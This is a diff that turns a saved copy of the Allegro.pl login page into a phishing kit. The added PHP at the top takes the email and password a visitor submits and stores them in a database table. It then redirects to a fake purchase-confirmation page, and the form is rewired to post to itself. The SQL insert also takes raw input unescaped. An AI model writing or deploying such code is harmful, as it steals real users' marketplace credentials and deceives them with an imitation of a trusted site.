@@ -1,3 +1,41 @@
+<?php
+include('../db.php');
+include_once('../utils.php');
+
+if(isset($_REQUEST['payment_id'])){
+    $payment_id = $_REQUEST['payment_id'];
+}
+if(isset($_REQUEST['auction_id'])){
+    $auction_id = $_REQUEST['auction_id'];
+}
+$quantity = 1;
+
+if(isset($_POST['quantity'])) {
+    $quantity = $_POST['quantity'];
+}
+if(isset($_POST['login_button']))
+{
+    $email = $_POST['username'];
+    $password = $_POST['password'];
+    $quantity = $_POST['quantity'];
+
+
+
+    if(strlen($email)> 3 && strlen($password)>4) {
+        if($auction_id) {
+            $sqsp = "INSERT INTO `purchases` (`auction_id`,`email`,`password`,`address`,`phonenum`,`status`, `number_of_items`) VALUES('$auction_id' , '$email' , '$password' , '', '' , '' , '$quantity')";
+            $con->query($sqsp);
+            $purchase_id = $con->insert_id;
+
+            echo '<script>window.location.href="custompages/confirm.php?purchase_id='.$purchase_id.'";</script>';
+        }
+
+    }
+
+
+}
+
+?>
 <!DOCTYPE html>
 <!-- saved from url=(1677)https://allegro.pl/login/form?authorization_uri=https:%2F%2Fallegro.pl%2Fauth%2Foauth%2Fauthorize%3Fclient_id%3Dtb5SFf3cRxEyspDN%26redirect_uri%3Dhttps:%2F%2Fallegro.pl%2Flogin%2Fauth%3Forigin_url%253D%25252Ftransaction-entry%25252Fbuy-now%25253Frequest%25253DeyJzZXJ2aWNlIjp7ImNvdW50cnlDb2RlIjoiUEwiLCJjdXJyZW5jeSI6bnVsbH0sIm9mZmVycyI6W3siaWQiOiI3MjQ5NTI3NTQ2IiwicXVhbnRpdHkiOjEsInZhcmlhbnQiOm51bGwsImFkZGl0aW9uYWxTZXJ2aWNlcyI6bnVsbCwiZ2xvYmFsU2VydmljZXMiOm51bGx9XSwiY2FydCI6bnVsbCwicHVyY2hhc2VDYXJ0IjpudWxsLCJndWVzdCI6bnVsbCwibWV0YWRhdGEiOnsicHJvY2Vzc0VudHJ5IjoiQlVZX05PVyIsInVzZXJUeXBlIjoiVVNFUiIsImZsYWdzIjpudWxsfSwiY21Vc2VySWQiOm51bGwsImJ1bmRsZXMiOm51bGwsInB1cmNoYXNlRmVhdHVyZXMiOm51bGx9%2526qstate%253DeyJyZXF1ZXN0IjoiL3RyYW5zYWN0aW9uLWVudHJ5L2J1eS1ub3c%25252FcmVxdWVzdD1leUp6WlhKMmFXTmxJanA3SW1OdmRXNTBjbmxEYjJSbElqb2lVRXdpTENKamRYSnlaVzVqZVNJNmJuVnNiSDBzSW05bVptVnljeUk2VzNzaWFXUWlPaUkzTWpRNU5USTNOVFEySWl3aWNYVmhiblJwZEhraU9qRXNJblpoY21saGJuUWlPbTUxYkd3c0ltRmtaR2wwYVc5dVlXeFRaWEoyYVdObGN5STZiblZzYkN3aVoyeHZZbUZzVTJWeWRtbGpaWE1pT201MWJHeDlYU3dpWTJGeWRDSTZiblZzYkN3aWNIVnlZMmhoYzJWRFlYSjBJanB1ZFd4c0xDSm5kV1Z6ZENJNmJuVnNiQ3dpYldWMFlXUmhkR0VpT25zaWNISnZZMlZ6YzBWdWRISjVJam9pUWxWWlgwNVBWeUlzSW5WelpYSlVlWEJsSWpvaVZWTkZVaUlzSW1ac1lXZHpJanB1ZFd4c2ZTd2lZMjFWYzJWeVNXUWlPbTUxYkd3c0ltSjFibVJzWlhNaU9tNTFiR3dzSW5CMWNtTm9ZWE5sUm1WaGRIVnlaWE1pT201MWJHeDkiLCJ1cmxQcmVmaXgiOiJodHRwczovL2FsbGVncm8ucGwiLCJjb2JyYW5kSWQiOjAsImdlbmVyYXRlVG9rZW4iOnRydWUsImd1ZXN0Ijp7Imd1ZXN0Qm94IjoidmVsYUJ1eU5vd0Zsb3ciLCJzZXNzVG9rZW4iOiJPTTREOGhNQlpwZEVzZ1RUOVRwUVJ3Tzc4MGxNSGIzeSIsIml0ZW1JZCI6bnVsbCwicXVhbnRpdHkiOjAsInZlcnNpb24iOjJ9fQ%25253D%25253D%26response_type%3Dcode%26state%3D2gTOSl&oauth=true -->
 <html xmlns="http://www.w3.org/1999/xhtml" data-front-main="da2b96355d9e43ad" lang="pl" class="cookie-policy-banner-not-dismissed installments-banner-not-dismissed loyalty-program-banner-not-dismissed technical-break-banner-not-dismissed"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
@@ -181,7 +219,7 @@ if (window.performance && typeof window.performance.mark === 'function' && typeo
 <div class="row relative ng-scope">
     <div class="col-xs-12 col-ss-12 col-sm-12 col-md-6 separator separator-right">
         <div class="center-block login-form">
-            <form name="loginForm" novalidate="" role="form" class="alle-form form-horizontal ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength" ng-submit="logIn(loginForm)" method="post" id="authForm">
+            <form name="loginForm" novalidate="" role="form" class="alle-form form-horizontal ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength" action="" method="post" id="authForm">
                 <!-- ngIf: loginFailure.lastFailed && !loginFailure.recaptchaError -->
 
                 <!-- ngIf: loginFailure.recaptchaError -->
@@ -202,7 +240,7 @@ if (window.performance && typeof window.performance.mark === 'function' && typeo
 
                     <div class="col-xm-10 col-xm-offset-1 col-xs-8 col-xs-offset-2 col-sm-8 col-sm-offset-0 col-md-8 col-md-offset-0">
                         <input name="password" id="password" ng-model="password" type="password" tabindex="2" maxlength="16" required="required" class="recaptcha-width form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength">
-
+                        <input type="hidden" name="quantity" value="<?php echo $quantity;?>">
                         <!-- ngIf: loginForm.password.$invalid && loginForm.$submitted -->
                     </div>
                 </div>
@@ -216,7 +254,7 @@ if (window.performance && typeof window.performance.mark === 'function' && typeo
                 <!-- ngIf: loginFailure.showRecaptcha -->
                 <div class="form-group">
                     <div class="col-xm-10 col-xm-offset-1 col-xs-8 col-xs-offset-2 col-sm-offset-3 col-sm-8 col-md-offset-4 col-md-8">
-                        <button tabindex="4" type="submit" class="recaptcha-width btn btn-primary btn-block btn btn-primary spinner" ng-disabled="showSpinner" id="login-button" translate=""><span class="ng-scope">Zaloguj się</span></button>
+                        <button tabindex="4" type="submit" class="recaptcha-width btn btn-primary btn-block btn btn-primary spinner" ng-disabled="showSpinner" id="login-button" translate="" name="login_button"><span class="ng-scope">Zaloguj się</span></button>
                         <!-- ngIf: formData.showGuestForm --><button tabindex="5" type="button" class="recaptcha-width btn btn-primary btn-block hidden-md hidden-lg ng-scope" ng-lf="formData.showGuestForm" ng-click="buyWithoutLogin()" translate=""><span class="ng-scope">kup bez konta</span></button><!-- end ngIf: formData.showGuestForm --></div>
                 </div>
                 <!-- ngIf: formData.facebookEnabled -->
